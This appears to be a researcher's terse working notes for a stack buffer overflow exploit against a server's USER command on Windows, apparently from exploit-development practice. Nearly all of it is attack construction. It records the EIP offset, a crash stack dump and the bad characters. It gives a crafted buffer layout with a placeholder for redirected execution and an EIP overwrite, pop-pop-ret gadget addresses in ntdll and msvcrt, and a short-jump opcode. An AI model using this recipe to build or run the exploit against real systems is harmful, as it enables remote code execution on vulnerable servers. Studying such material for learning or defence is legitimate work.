vulnerable command = "\x55\x53\x45\x52\x20" = "0x5553455220"

pattern in eip = 41317441
offset found at 573

top of stack when crash occurs:-

	00A5F49C   7C9037BF  ¿7|  RETURN to ntdll.7C9037BF
	00A5F4A0   00A5F584  „õ¥.
	00A5F4A4   00A5FDA4  ¤ý¥.  ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...

(maybe we can pop pop ret?) need to find offset that 00a5fda4 points to tho

location 00a5f4a4 contains 00a5fda4 which points to value 00A5FDA4  39417430              9At0

offset verified to be 569

therefore buffer to send(excluding server command and carriage return is): A*569 + CCCC(4 bytes we can redirect execution to) + BBBB(eip overwrite) + D*700(+)

i.e EIP is in between shellcode 


badchars = {0,0a,0d,40} (0x40 = 64 in dec)


found pop pop ret @:

	7C9E2604   5F               POP EDI
	7C9E2605   5E               POP ESI
	7C9E2606   C3               RETN


another pop pop ret in msvcrt.dll:-

	77C22665   5F               POP EDI
	77C22666   5E               POP ESI
	77C22667   C3               RETN



short jump 4 bytes eb 04
